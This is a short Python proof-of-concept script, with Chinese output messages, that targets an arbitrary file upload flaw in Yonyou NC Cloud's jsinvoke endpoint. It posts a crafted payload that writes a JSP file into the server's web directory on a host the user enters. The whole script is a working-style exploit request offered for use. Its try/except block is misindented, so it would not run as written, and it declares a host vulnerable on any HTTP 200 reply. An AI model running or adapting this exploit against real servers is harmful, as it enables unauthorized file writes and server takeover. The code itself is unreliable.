```python
import requests

def verify(ip):

    url = f'{ip}/uapjs/jsinvoke/?action=invoke'
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    }
    payload = '''
    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
    "parameterTypes":["java.lang.Object","java.lang.String"],
    "parameters":["123456","webapps/nc_web/2YIOmzdcUDhwMYTLk65p3cgxvxy.jsp"]}
    '''
    try:
        response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 200 :
        print(f"{ip}存在用友 NC Cloud jsinvoke 任意文件上传漏洞！！！")
    else:
        print('漏洞不存在。')
    except Exception as e:
        pass

if __name__ == '__main__':
    self = input('请输入目标主机IP地址：')
    verify(self)
```

